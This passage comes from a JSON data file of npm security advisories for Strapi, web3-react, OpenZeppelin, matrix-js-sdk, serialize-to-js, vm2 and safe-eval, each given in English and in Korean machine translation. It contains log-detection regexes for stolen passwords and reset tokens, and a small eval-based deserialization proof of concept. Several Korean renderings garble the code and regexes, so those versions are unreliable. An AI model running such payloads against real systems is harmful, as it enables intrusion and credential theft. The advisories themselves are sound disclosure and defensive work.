    "references": "https://github.com/strapi/strapi/security/advisories/GHSA-jjqf-j4w7-92w8\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-22894\nhttps://github.com/strapi/strapi/releases\nhttps://github.com/strapi/strapi/releases/tag/v4.8.0\nhttps://strapi.io/blog/security-disclosure-of-vulnerabilities-cve\nhttps://www.ghostccamm.com/blog/multi_strapi_vulns/\nhttps://github.com/advisories/GHSA-jjqf-j4w7-92w8",
    "name": "@strapi/strapi",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.2.1, < 4.8.0",
    "identifier": "4.8.0",
    "descriptionKR": "### 요약\n\nStrapi에서 4.7.1까지 인증되지 않은 공격자가 Strapi 관리자 및 API 사용자에 대한 중요한 사용자 세부 정보를 검색할 수 있습니다.\n\n### 세부 정보\n\nStrapi에서 4.7.1까지 인증되지 않은 공격자가 Strapi 관리자 및 API 사용자에 대한 중요한 사용자 세부 정보를 검색할 수 있습니다. 인증되지 않은 공격자는 중요한 정보가 포함된 열로 사용자를 필터링하고 API 응답의 변경 사항으로 값을 유추할 수 있습니다. 인증되지 않은 공격자는 이 취약점을 악용하여 Strapi 관리자 계정을 탈취하고 비밀번호 재설정 토큰을 유출하고 관리자 비밀번호를 변경하여 무단 Strapi Super Administrator 액세스 권한을 얻을 수 있습니다. 이는 모든 Strapi 버전 <=4.7.1에서 악용될 수 있습니다.\n\n### IoC\n\nCVE-2023-22894의 악용은 페이로드가 GET 매개변수 내에 있고 일반적으로 요청 로그에 포함되기 때문에 쉽게 감지할 수 있습니다. 다음 정규식 패턴은 이 취약점을 악용하여 사용자의 이메일, 암호 및 암호 재설정 토큰 열을 유출하는 요청을 추출합니다.\n\n`/(\\[|%5B)\\s*(이메일|암호|reset_password_token|resetPasswordToken)\\s*(\\]|%5D)/`\n\n다음 grep 명령을 사용하여 이 IoC에 대한 로그 파일을 검색할 수 있습니다.\n\n`grep -iE '(\\[|%5B)\\s*(email|password|reset_password_token|resetPasswordToken)\\s*(\\]|%5D)' $PATH_TO_LOG_FILE`\n\n위의 정규식 패턴이 로그 파일의 행과 일치하는 경우 password, reset_password_token 또는 resetPasswordToken을 포함하는 여러 요청이 있는지 특별히 주의하십시오. 이것은 공격자가 귀하의 Strapi 서버에서 암호 해시 및 재설정 토큰을 유출했으며 즉시 사고 대응을 시작해야 함을 나타냅니다!\n\n### 영향\n\n4.8.0 미만의 모든 Strapi 사용자"
  },
  {
    "description": "### Impact\n`chainId` may be outdated if the user changes chains as part of the connection flow. This means that the value of `chainId` returned by `useWeb3React()` may be incorrect. In an application, this means that any data derived from `chainId` could be incorrect.\n\nFor example, if a swapping application derives a wrapped token contract address from the `chainId` *and* a user has changed chains as part of their connection flow the application could cause the user to send funds to the incorrect address when wrapping. This is a common approach when using other foundational libraries like [`ethers`](https://github.com/ethers-io/ethers.js), and most users of v8 will want to upgrade past the affected versions.\n\n### Patches\nPatched in https://github.com/Uniswap/web3-react/pull/749.\nUsers of web3-react@8.0.x-beta.0 should upgrade to at least:\n - @web3-react/coinbase-wallet@^8.0.35-beta.0\n - @web3-react/eip1193@^8.0.27-beta.0\n - @web3-react/metamask@^8.0.30-beta.0\n - @web3-react/walletconnect@^8.0.37-beta.0\n\n### Workarounds\nN/A\n\n### References\nN/A\n",
    "identifiers": "GHSA : GHSA-8pf3-6fgr-3g3g\nCVE : CVE-2023-30543",
    "severity": "MODERATE",
    "updatedAt": "2023-04-18T22:29:55Z",
    "publishedAt": "2023-04-18T22:29:53Z",
    "references": "https://github.com/Uniswap/web3-react/security/advisories/GHSA-8pf3-6fgr-3g3g\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-30543\nhttps://github.com/Uniswap/web3-react/pull/749\nhttps://github.com/advisories/GHSA-8pf3-6fgr-3g3g",
    "name": "@web3-react/walletconnect",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 8.0.37-beta.0",
    "identifier": "8.0.37-beta.0",
    "descriptionKR": "### 영향\n사용자가 연결 흐름의 일부로 체인을 변경하는 경우 'chainId'가 오래되었을 수 있습니다. 이는 `useWeb3React()`에 의해 반환된 `chainId` 값이 올바르지 않을 수 있음을 의미합니다. 애플리케이션에서 이는 `chainId`에서 파생된 모든 데이터가 올바르지 않을 수 있음을 의미합니다.\n\n예를 들어, 스와핑 애플리케이션이 'chainId'에서 래핑된 토큰 계약 주소를 파생하고* 사용자가 연결 흐름의 일부로 체인을 변경한 경우 애플리케이션은 사용자가 래핑할 때 잘못된 주소로 자금을 보내도록 할 수 있습니다. 이것은 [`ethers`](https://github.com/ethers-io/ethers.js)와 같은 다른 기본 라이브러리를 사용할 때 일반적인 접근 방식이며 대부분의 v8 사용자는 영향을 받는 버전을 지나서 업그레이드하기를 원할 것입니다.\n\n### 패치\nhttps://github.com/Uniswap/web3-react/pull/749에서 패치되었습니다.\nweb3-react@8.0.x-beta.0 사용자는 최소한 다음으로 업그레이드해야 합니다.\n - @web3-react/coinbase-wallet@^8.0.35-beta.0\n - @web3-react/eip1193@^8.0.27-beta.0\n - @web3-react/metamask@^8.0.30-beta.0\n - @web3-react/walletconnect@^8.0.37-beta.0\n\n### 해결 방법\n해당 없음\n\n### 참조\n해당 없음"
  },
  {
    "description": "### Impact\n`chainId` may be outdated if the user changes chains as part of the connection flow. This means that the value of `chainId` returned by `useWeb3React()` may be incorrect. In an application, this means that any data derived from `chainId` could be incorrect.\n\nFor example, if a swapping application derives a wrapped token contract address from the `chainId` *and* a user has changed chains as part of their connection flow the application could cause the user to send funds to the incorrect address when wrapping. This is a common approach when using other foundational libraries like [`ethers`](https://github.com/ethers-io/ethers.js), and most users of v8 will want to upgrade past the affected versions.\n\n### Patches\nPatched in https://github.com/Uniswap/web3-react/pull/749.\nUsers of web3-react@8.0.x-beta.0 should upgrade to at least:\n - @web3-react/coinbase-wallet@^8.0.35-beta.0\n - @web3-react/eip1193@^8.0.27-beta.0\n - @web3-react/metamask@^8.0.30-beta.0\n - @web3-react/walletconnect@^8.0.37-beta.0\n\n### Workarounds\nN/A\n\n### References\nN/A\n",
    "identifiers": "GHSA : GHSA-8pf3-6fgr-3g3g\nCVE : CVE-2023-30543",
    "severity": "MODERATE",
    "updatedAt": "2023-04-18T22:29:55Z",
    "publishedAt": "2023-04-18T22:29:53Z",
    "references": "https://github.com/Uniswap/web3-react/security/advisories/GHSA-8pf3-6fgr-3g3g\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-30543\nhttps://github.com/Uniswap/web3-react/pull/749\nhttps://github.com/advisories/GHSA-8pf3-6fgr-3g3g",
    "name": "@web3-react/metamask",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 8.0.30-beta.0",
    "identifier": "8.0.30-beta.0",
    "descriptionKR": "### 영향\n사용자가 연결 흐름의 일부로 체인을 변경하는 경우 'chainId'가 오래되었을 수 있습니다. 이는 `useWeb3React()`에 의해 반환된 `chainId` 값이 올바르지 않을 수 있음을 의미합니다. 애플리케이션에서 이는 `chainId`에서 파생된 모든 데이터가 올바르지 않을 수 있음을 의미합니다.\n\n예를 들어, 스와핑 애플리케이션이 'chainId'에서 래핑된 토큰 계약 주소를 파생하고* 사용자가 연결 흐름의 일부로 체인을 변경한 경우 애플리케이션은 사용자가 래핑할 때 잘못된 주소로 자금을 보내도록 할 수 있습니다. 이것은 [`ethers`](https://github.com/ethers-io/ethers.js)와 같은 다른 기본 라이브러리를 사용할 때 일반적인 접근 방식이며 대부분의 v8 사용자는 영향을 받는 버전을 지나서 업그레이드하기를 원할 것입니다.\n\n### 패치\nhttps://github.com/Uniswap/web3-react/pull/749에서 패치되었습니다.\nweb3-react@8.0.x-beta.0 사용자는 최소한 다음으로 업그레이드해야 합니다.\n - @web3-react/coinbase-wallet@^8.0.35-beta.0\n - @web3-react/eip1193@^8.0.27-beta.0\n - @web3-react/metamask@^8.0.30-beta.0\n - @web3-react/walletconnect@^8.0.37-beta.0\n\n### 해결 방법\n해당 없음\n\n### 참조\n해당 없음"
  },
  {
    "description": "### Impact\n`chainId` may be outdated if the user changes chains as part of the connection flow. This means that the value of `chainId` returned by `useWeb3React()` may be incorrect. In an application, this means that any data derived from `chainId` could be incorrect.\n\nFor example, if a swapping application derives a wrapped token contract address from the `chainId` *and* a user has changed chains as part of their connection flow the application could cause the user to send funds to the incorrect address when wrapping. This is a common approach when using other foundational libraries like [`ethers`](https://github.com/ethers-io/ethers.js), and most users of v8 will want to upgrade past the affected versions.\n\n### Patches\nPatched in https://github.com/Uniswap/web3-react/pull/749.\nUsers of web3-react@8.0.x-beta.0 should upgrade to at least:\n - @web3-react/coinbase-wallet@^8.0.35-beta.0\n - @web3-react/eip1193@^8.0.27-beta.0\n - @web3-react/metamask@^8.0.30-beta.0\n - @web3-react/walletconnect@^8.0.37-beta.0\n\n### Workarounds\nN/A\n\n### References\nN/A\n",
    "identifiers": "GHSA : GHSA-8pf3-6fgr-3g3g\nCVE : CVE-2023-30543",
    "severity": "MODERATE",
    "updatedAt": "2023-04-18T22:29:55Z",
    "publishedAt": "2023-04-18T22:29:53Z",
    "references": "https://github.com/Uniswap/web3-react/security/advisories/GHSA-8pf3-6fgr-3g3g\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-30543\nhttps://github.com/Uniswap/web3-react/pull/749\nhttps://github.com/advisories/GHSA-8pf3-6fgr-3g3g",
    "name": "@web3-react/eip1193",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 8.0.27-beta.0",
    "identifier": "8.0.27-beta",
    "descriptionKR": "### 영향\n사용자가 연결 흐름의 일부로 체인을 변경하는 경우 'chainId'가 오래되었을 수 있습니다. 이는 `useWeb3React()`에 의해 반환된 `chainId` 값이 올바르지 않을 수 있음을 의미합니다. 애플리케이션에서 이는 `chainId`에서 파생된 모든 데이터가 올바르지 않을 수 있음을 의미합니다.\n\n예를 들어, 스와핑 애플리케이션이 'chainId'에서 래핑된 토큰 계약 주소를 파생하고* 사용자가 연결 흐름의 일부로 체인을 변경한 경우 애플리케이션은 사용자가 래핑할 때 잘못된 주소로 자금을 보내도록 할 수 있습니다. 이것은 [`ethers`](https://github.com/ethers-io/ethers.js)와 같은 다른 기본 라이브러리를 사용할 때 일반적인 접근 방식이며 대부분의 v8 사용자는 영향을 받는 버전을 지나서 업그레이드하기를 원할 것입니다.\n\n### 패치\nhttps://github.com/Uniswap/web3-react/pull/749에서 패치되었습니다.\nweb3-react@8.0.x-beta.0 사용자는 최소한 다음으로 업그레이드해야 합니다.\n - @web3-react/coinbase-wallet@^8.0.35-beta.0\n - @web3-react/eip1193@^8.0.27-beta.0\n - @web3-react/metamask@^8.0.30-beta.0\n - @web3-react/walletconnect@^8.0.37-beta.0\n\n### 해결 방법\n해당 없음\n\n### 참조\n해당 없음"
  },
  {
    "description": "### Impact\n`chainId` may be outdated if the user changes chains as part of the connection flow. This means that the value of `chainId` returned by `useWeb3React()` may be incorrect. In an application, this means that any data derived from `chainId` could be incorrect.\n\nFor example, if a swapping application derives a wrapped token contract address from the `chainId` *and* a user has changed chains as part of their connection flow the application could cause the user to send funds to the incorrect address when wrapping. This is a common approach when using other foundational libraries like [`ethers`](https://github.com/ethers-io/ethers.js), and most users of v8 will want to upgrade past the affected versions.\n\n### Patches\nPatched in https://github.com/Uniswap/web3-react/pull/749.\nUsers of web3-react@8.0.x-beta.0 should upgrade to at least:\n - @web3-react/coinbase-wallet@^8.0.35-beta.0\n - @web3-react/eip1193@^8.0.27-beta.0\n - @web3-react/metamask@^8.0.30-beta.0\n - @web3-react/walletconnect@^8.0.37-beta.0\n\n### Workarounds\nN/A\n\n### References\nN/A\n",
    "identifiers": "GHSA : GHSA-8pf3-6fgr-3g3g\nCVE : CVE-2023-30543",
    "severity": "MODERATE",
    "updatedAt": "2023-04-18T22:29:55Z",
    "publishedAt": "2023-04-18T22:29:53Z",
    "references": "https://github.com/Uniswap/web3-react/security/advisories/GHSA-8pf3-6fgr-3g3g\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-30543\nhttps://github.com/Uniswap/web3-react/pull/749\nhttps://github.com/advisories/GHSA-8pf3-6fgr-3g3g",
    "name": "@web3-react/coinbase-wallet",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 8.0.35-beta.0",
    "identifier": "8.0.35-beta.0",
    "descriptionKR": "### 영향\n사용자가 연결 흐름의 일부로 체인을 변경하는 경우 'chainId'가 오래되었을 수 있습니다. 이는 `useWeb3React()`에 의해 반환된 `chainId` 값이 올바르지 않을 수 있음을 의미합니다. 애플리케이션에서 이는 `chainId`에서 파생된 모든 데이터가 올바르지 않을 수 있음을 의미합니다.\n\n예를 들어, 스와핑 애플리케이션이 'chainId'에서 래핑된 토큰 계약 주소를 파생하고* 사용자가 연결 흐름의 일부로 체인을 변경한 경우 애플리케이션은 사용자가 래핑할 때 잘못된 주소로 자금을 보내도록 할 수 있습니다. 이것은 [`ethers`](https://github.com/ethers-io/ethers.js)와 같은 다른 기본 라이브러리를 사용할 때 일반적인 접근 방식이며 대부분의 v8 사용자는 영향을 받는 버전을 지나서 업그레이드하기를 원할 것입니다.\n\n### 패치\nhttps://github.com/Uniswap/web3-react/pull/749에서 패치되었습니다.\nweb3-react@8.0.x-beta.0 사용자는 최소한 다음으로 업그레이드해야 합니다.\n - @web3-react/coinbase-wallet@^8.0.35-beta.0\n - @web3-react/eip1193@^8.0.27-beta.0\n - @web3-react/metamask@^8.0.30-beta.0\n - @web3-react/walletconnect@^8.0.37-beta.0\n\n### 해결 방법\n해당 없음\n\n### 참조\n해당 없음"
  },
  {
    "description": "### Summary\n\nStrapi through 4.5.6 does not verify the access or ID tokens issued during the OAuth flow when the AWS Cognito login provider is used for authentication.\n\n### Details\n\nStrapi through 4.5.6 does not verify the access or ID tokens issued during the OAuth flow when the AWS Cognito login provider is used for authentication. A remote attacker could forge an ID token that is signed using the 'None' type algorithm to bypass authentication and impersonate any user that use AWS Cognito for authentication.\n\n### IoC\n\nReviewing of application logs is recommended to detect any suspicious activity. Running the following regex pattern will extract all ID tokens sent to `/api/auth/cognito/callback`.\n\n`/\\/api\\/auth\\/cognito\\/callback\\?[\\s\\S]*id_token=\\s*([\\S]*)/`\n\nOnce you have a list of the ID tokens, you will need to verify each token using the public key file for your AWS Cognito user pool that you can download from `https://cognito-idp.{region}.amazonaws.com/{userPoolId}/.well-known/jwks.json`. If there are any JWT tokens that cannot be verified using the correct public key, then you need to inspect the JWT body and see if it contains the `email` and `cognito:username` claims (example below).\n\n```json\n{\n  \"cognito:username\": \"auth-bypass-example\",\n  \"email\": \"user@example.com\"\n}\n```\n\nIf there are any JWTs that have this body, verify when the account with the email address was created. If the account was created earlier than the request to `/api/auth/cognito/callback` with the invalid JWT token, then you need to contact the user to inform them their account has been breached!\n\nAfter upgrading to Strapi v4.6.0 or greater you will need to reconfigure your AWS Cognito provider to include the JWKS URL for it to work properly. If you do not reconfigure your provider you will receive an error message when attempting to login.\n\n\n### Impact\n\nAny Strapi user using the users-permissions AWS Cognito provider before 4.6.0\n",
    "identifiers": "GHSA : GHSA-xv3q-jrmm-4fxv",
    "severity": "HIGH",
    "updatedAt": "2023-04-19T12:11:58Z",
    "publishedAt": "2023-04-18T22:28:02Z",
    "references": "https://github.com/strapi/strapi/security/advisories/GHSA-xv3q-jrmm-4fxv\nhttps://github.com/strapi/strapi/pull/15382\nhttps://github.com/strapi/strapi/commit/d0edd25ceb49d275d710bf8d59999a2c07072893\nhttps://github.com/strapi/strapi/releases/tag/v4.6.0\nhttps://github.com/advisories/GHSA-xv3q-jrmm-4fxv",
    "name": "@strapi/plugin-users-permissions",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.2.1, < 4.6.0",
    "identifier": "4.6.0",
    "descriptionKR": "### 요약\n\n4.5.6까지의 Strapi는 AWS Cognito 로그인 공급자가 인증에 사용될 때 OAuth 흐름 중에 발급된 액세스 또는 ID 토큰을 확인하지 않습니다.\n\n### 세부 정보\n\n4.5.6까지의 Strapi는 AWS Cognito 로그인 공급자가 인증에 사용될 때 OAuth 흐름 중에 발급된 액세스 또는 ID 토큰을 확인하지 않습니다. 원격 공격자는 '없음' 유형 알고리즘을 사용하여 서명된 ID 토큰을 위조하여 인증을 우회하고 인증에 AWS Cognito를 사용하는 모든 사용자를 가장할 수 있습니다.\n\n### IoC\n\n의심스러운 활동을 감지하려면 애플리케이션 로그를 검토하는 것이 좋습니다. 다음 정규식 패턴을 실행하면 `/api/auth/cognito/callback`으로 전송된 모든 ID 토큰이 추출됩니다.\n\n`/\\/api\\/auth\\/cognito\\/callback\\?[\\s\\S]*id_token=\\s*([\\S]*)/`\n\nID 토큰 목록이 있으면 `https://cognito-idp.{region}.amazonaws.com/에서 다운로드할 수 있는 AWS Cognito 사용자 풀의 공개 키 파일을 사용하여 각 토큰을 확인해야 합니다. {userPoolId}/.well-known/jwks.json`. 올바른 공개 키를 사용하여 확인할 수 없는 JWT 토큰이 있는 경우 JWT 본문을 검사하고 `email` 및 `cognito:username` 클레임(아래 예)이 포함되어 있는지 확인해야 합니다.\n\n```json\n{\n  \"cognito:username\": \"auth-bypass-example\",\n  \"이메일\": \"user@example.com\"\n}\n```\n\n이 본문이 있는 JWT가 있는 경우 이메일 주소가 있는 계정이 생성된 시기를 확인합니다. 유효하지 않은 JWT 토큰으로 `/api/auth/cognito/callback`에 대한 요청보다 이전에 계정이 생성된 경우 사용자에게 연락하여 계정이 위반되었음을 알려야 합니다!\n\nStrapi v4.6.0 이상으로 업그레이드한 후 제대로 작동하려면 JWKS URL을 포함하도록 AWS Cognito 공급자를 재구성해야 합니다. 공급자를 재구성하지 않으면 로그인을 시도할 때 오류 메시지가 표시됩니다.\n\n\n### 영향\n\n4.6.0 이전의 사용자 권한 AWS Cognito 공급자를 사용하는 모든 Strapi 사용자"
  },
  {
    "description": "### Impact\n\nA function in the implementation contract may be inaccessible if its selector clashes with one of the proxy's own selectors. Specifically, if the clashing function has a different signature with incompatible ABI encoding, the proxy could revert while attempting to decode the arguments from calldata.\n\nThe probability of an accidental clash is negligible, but one could be caused deliberately.\n\n### Patches\n\nThe issue has been fixed in v4.8.3.\n\n### Workarounds\n\nIf a function appears to be inaccessible for this reason, it may be possible to craft the calldata such that ABI decoding does not fail at the proxy and the function is properly proxied through.\n\n### References\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/4154\n",
    "identifiers": "GHSA : GHSA-mx2q-35m2-x2rh\nCVE : CVE-2023-30541",
    "severity": "MODERATE",
    "updatedAt": "2023-04-18T16:14:55Z",
    "publishedAt": "2023-04-17T16:45:21Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-mx2q-35m2-x2rh\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/4154\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-30541\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.8.3\nhttps://github.com/advisories/GHSA-mx2q-35m2-x2rh",
    "name": "@openzeppelin/contracts-upgradeable",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.2.0, < 4.8.3",
    "identifier": "4.8.3",
    "descriptionKR": "### 영향\n\n선택기가 프록시 자체 선택기 중 하나와 충돌하는 경우 구현 계약의 기능에 액세스하지 못할 수 있습니다. 특히 충돌하는 함수에 호환되지 않는 ABI 인코딩과 다른 서명이 있는 경우 프록시는 calldata에서 인수를 디코딩하려고 시도하는 동안 되돌릴 수 있습니다.\n\n우발적인 충돌의 가능성은 무시할 수 있지만 의도적으로 발생할 수 있습니다.\n\n### 패치\n\n이 문제는 v4.8.3에서 수정되었습니다.\n\n### 해결 방법\n\n이러한 이유로 함수에 액세스할 수 없는 것으로 나타나면 ABI 디코딩이 프록시에서 실패하지 않고 함수가 적절하게 프록시되도록 호출 데이터를 조작하는 것이 가능할 수 있습니다.\n\n### 참조\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/4154"
  },
  {
    "description": "### Impact\n\nA function in the implementation contract may be inaccessible if its selector clashes with one of the proxy's own selectors. Specifically, if the clashing function has a different signature with incompatible ABI encoding, the proxy could revert while attempting to decode the arguments from calldata.\n\nThe probability of an accidental clash is negligible, but one could be caused deliberately.\n\n### Patches\n\nThe issue has been fixed in v4.8.3.\n\n### Workarounds\n\nIf a function appears to be inaccessible for this reason, it may be possible to craft the calldata such that ABI decoding does not fail at the proxy and the function is properly proxied through.\n\n### References\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/4154\n",
    "identifiers": "GHSA : GHSA-mx2q-35m2-x2rh\nCVE : CVE-2023-30541",
    "severity": "MODERATE",
    "updatedAt": "2023-04-18T16:14:55Z",
    "publishedAt": "2023-04-17T16:45:21Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-mx2q-35m2-x2rh\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/4154\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-30541\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.8.3\nhttps://github.com/advisories/GHSA-mx2q-35m2-x2rh",
    "name": "@openzeppelin/contracts",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.2.0, < 4.8.3",
    "identifier": "4.8.3",
    "descriptionKR": "### 영향\n\n선택기가 프록시 자체 선택기 중 하나와 충돌하는 경우 구현 계약의 기능에 액세스하지 못할 수 있습니다. 특히 충돌하는 함수에 호환되지 않는 ABI 인코딩과 다른 서명이 있는 경우 프록시는 calldata에서 인수를 디코딩하려고 시도하는 동안 되돌릴 수 있습니다.\n\n우발적인 충돌의 가능성은 무시할 수 있지만 의도적으로 발생할 수 있습니다.\n\n### 패치\n\n이 문제는 v4.8.3에서 수정되었습니다.\n\n### 해결 방법\n\n이러한 이유로 함수에 액세스할 수 없는 것으로 나타나면 ABI 디코딩이 프록시에서 실패하지 않고 함수가 적절하게 프록시되도록 호출 데이터를 조작하는 것이 가능할 수 있습니다.\n\n### 참조\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/4154"
  },
  {
    "description": "### Impact\n\nAn attacker present in a room where an [MSC3401](https://github.com/matrix-org/matrix-spec-proposals/pull/3401) group call is taking place can eavesdrop on the video and audio of participants using matrix-js-sdk, without their knowledge. To affected matrix-js-sdk users, the attacker will not appear to be participating in the call.\n\nThis attack is possible because matrix-js-sdk's group call implementation accepts incoming direct calls from other users, even if they have not yet declared intent to participate in the group call, as a means of resolving a race condition in call setup. Affected versions do not restrict access to the user's outbound media in this case.\n\nLegacy 1:1 calls are unaffected.\n\n### Workarounds\n\nUsers may hold group calls in private rooms where only the exact users who are expected to participate in the call are present.",
    "identifiers": "GHSA : GHSA-6g67-q39g-r79q\nCVE : CVE-2023-29529",
    "severity": "MODERATE",
    "updatedAt": "2023-04-25T16:35:48Z",
    "publishedAt": "2023-04-14T16:14:17Z",
    "references": "https://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-6g67-q39g-r79q\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-29529\nhttps://github.com/matrix-org/matrix-spec-proposals/pull/3401\nhttps://github.com/matrix-org/matrix-js-sdk/releases/tag/v24.1.0\nhttps://github.com/advisories/GHSA-6g67-q39g-r79q",
    "name": "matrix-js-sdk",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 24.1.0",
    "identifier": "24.1.0",
    "descriptionKR": "### 영향\n\n[MSC3401](https://github.com/matrix-org/matrix-spec-proposals/pull/3401) 그룹 통화가 진행 중인 방에 있는 공격자는 매트릭스를 사용하여 참가자의 비디오 및 오디오를 도청할 수 있습니다. -js-sdk, 그들의 지식 없이. 영향을 받는 matrix-js-sdk 사용자에게 공격자는 호출에 참여하지 않는 것으로 보입니다.\n\n이 공격이 가능한 이유는 matrix-js-sdk의 그룹 호출 구현이 호출 설정에서 race condition을 해결하기 위한 수단으로 그룹 호출에 참여하겠다는 의사를 아직 선언하지 않은 다른 사용자로부터 들어오는 직접 호출을 수락하기 때문입니다. 이 경우 영향을 받는 버전은 사용자의 아웃바운드 미디어에 대한 액세스를 제한하지 않습니다.\n\n레거시 1:1 통화는 영향을 받지 않습니다.\n\n### 해결 방법\n\n사용자는 통화에 참여할 것으로 예상되는 정확한 사용자만 있는 개인 방에서 그룹 통화를 할 수 있습니다."
  },
  {
    "description": "Affected versions of `serialize-to-js` may be vulnerable to arbitrary code execution through an Immediately Invoked Function Expression (IIFE). \n\n## Proof of Concept\n```\nvar payload = \"{e: (function(){ eval('console.log(`exploited`)') })() }\"\nvar serialize = require('serialize-to-js');\nserialize.deserialize(payload);\n```\n\n\n## Recommendation\n\nUpdate to version 1.0.0, or later, and review [this disclaimer](https://www.npmjs.com/package/serialize-to-js#deserialize) from the author.",
    "identifiers": "GHSA : GHSA-mm62-wxc8-cf7m\nCVE : CVE-2017-5954",
    "severity": "CRITICAL",
    "updatedAt": "2023-04-13T22:32:52Z",
    "publishedAt": "2018-07-18T18:27:41Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2017-5954\nhttps://github.com/advisories/GHSA-mm62-wxc8-cf7m\nhttps://www.npmjs.com/advisories/313\nhttps://www.npmjs.com/package/serialize-to-js#deserialize\nhttps://github.com/commenthol/serialize-to-js/issues/1\nhttps://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/\nhttp://www.securityfocus.com/bid/96223\nhttps://github.com/commenthol/serialize-to-js/commit/1cd433960e5b9db4c0b537afb28366198a319429",
    "name": "serialize-to-js",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.0.0",
    "identifier": "1.0.0",
    "descriptionKR": "영향을 받는 'serialize-to-js' 버전은 IIFE(즉시 호출 함수 표현식)를 통한 임의 코드 실행에 취약할 수 있습니다.\n\n## 개념의 증거\n```\nvar 페이로드 = \"{e: (function(){ eval('console.log(`exploited`)') })() }\"\nvar serialize = require('js로 직렬화');\nserialize.deserialize(페이로드);\n```\n\n\n## 추천\n\n버전 1.0.0 이상으로 업데이트하고 작성자의 [이 고지 사항](https://www.npmjs.com/package/serialize-to-js#deserialize)을 검토하세요."
  },
  {
    "description": "There exists a vulnerability in source code transformer (exception sanitization logic) of vm2 for versions up to 3.9.15, allowing attackers to bypass `handleException()` and leak unsanitized host exceptions which can be used to escape the sandbox and run arbitrary code in host context.\n\n### Impact\nA threat actor can bypass the sandbox protections to gain remote code execution rights on the host running the sandbox.\n\n### Patches\nThis vulnerability was patched in the release of version `3.9.16` of `vm2`.\n\n### Workarounds\nNone.\n\n### References\nGithub Issue - https://github.com/patriksimek/vm2/issues/516\nPoC - https://gist.github.com/leesh3288/f05730165799bf56d70391f3d9ea187c\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [VM2](https://github.com/patriksimek/vm2)\n\nThanks to [Xion](https://twitter.com/0x10n) (SeungHyun Lee) of [KAIST Hacking Lab](https://kaist-hacking.github.io/) for disclosing this vulnerability.",
    "identifiers": "GHSA : GHSA-xj72-wvfv-8985\nCVE : CVE-2023-29199",
    "severity": "CRITICAL",
    "updatedAt": "2023-04-14T21:35:02Z",
    "publishedAt": "2023-04-12T20:42:44Z",
    "references": "https://github.com/patriksimek/vm2/security/advisories/GHSA-xj72-wvfv-8985\nhttps://github.com/patriksimek/vm2/issues/516\nhttps://github.com/patriksimek/vm2/commit/24c724daa7c09f003e556d7cd1c7a8381cb985d7\nhttps://gist.github.com/leesh3288/f05730165799bf56d70391f3d9ea187c\nhttps://github.com/patriksimek/vm2/releases/tag/3.9.16\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-29199\nhttps://github.com/advisories/GHSA-xj72-wvfv-8985",
    "name": "vm2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.9.16",
    "identifier": "3.9.16",
    "descriptionKR": "버전 3.9.15까지 vm2의 소스 코드 변환기(예외 삭제 로직)에 취약점이 존재하여 공격자가 `handleException()`을 우회하고 샌드박스를 탈출하고 임의 코드를 실행하는 데 사용할 수 있는 삭제되지 않은 호스트 예외를 유출할 수 있습니다. 호스트 컨텍스트.\n\n### 영향\n공격자는 샌드박스 보호를 우회하여 샌드박스를 실행하는 호스트에서 원격 코드 실행 권한을 얻을 수 있습니다.\n\n### 패치\n이 취약점은 `vm2`의 `3.9.16` 버전 릴리스에서 패치되었습니다.\n\n### 해결 방법\n없음.\n\n### 참조\nGithub 문제 - https://github.com/patriksimek/vm2/issues/516\nPoC - https://gist.github.com/leesh3288/f05730165799bf56d70391f3d9ea187c\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n- [VM2](https://github.com/patriksimek/vm2)에서 이슈 열기\n\n이 취약점을 공개해 주신 [KAIST Hacking Lab](https://kaist-hacking.github.io/)의 [Xion](https://twitter.com/0x10n)(이승현)님께 감사드립니다."
  },
  {
    "description": "All versions of the package safe-eval are vulnerable to Prototype Pollution via the safeEval function, due to improper sanitization of its parameter content.",
    "identifiers": "GHSA : GHSA-hcg3-56jf-x4vh\nCVE : CVE-2023-26121",
    "severity": "CRITICAL",
    "updatedAt": "2023-04-14T21:35:38Z",
    "publishedAt": "2023-04-11T06:30:29Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26121\nhttps://github.com/hacksparrow/safe-eval/issues/28\nhttps://gist.github.com/seongil-wi/9d9fc0cc5b7b130419cd45827e59c4f9\nhttps://security.snyk.io/vuln/SNYK-JS-SAFEEVAL-3373062\nhttps://github.com/advisories/GHSA-hcg3-56jf-x4vh",
    "name": "safe-eval",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.4.2",
